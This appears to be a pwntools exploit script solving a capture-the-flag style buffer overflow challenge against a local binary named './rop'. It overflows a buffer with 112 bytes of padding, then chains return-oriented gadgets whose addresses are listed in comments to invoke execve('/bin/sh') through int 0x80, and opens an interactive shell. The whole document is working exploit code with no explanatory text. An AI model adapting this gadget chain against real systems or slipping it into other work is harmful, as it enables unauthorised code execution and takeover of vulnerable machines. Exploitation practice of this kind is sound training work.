from pwn import *

p = process("./rop")
#0x080bb196: pop eax; ret;
#0x080be408  /bin/sh
#0x0806eb91: pop ecx; pop ebx; ret;
#0x0806eb6a: pop edx; ret;
#0x08049421: int 0x80;

elf = ELF("./rop")

payload = 112*'a' + p32(0x080bb196) + p32(0xb) + p32(0x0806eb91) + p32(0x0) + p32(0x080be408) + p32(0x0806eb6a) + p32(0x0) + p32(0x08049421)
p.sendline(payload)
p.interactive()
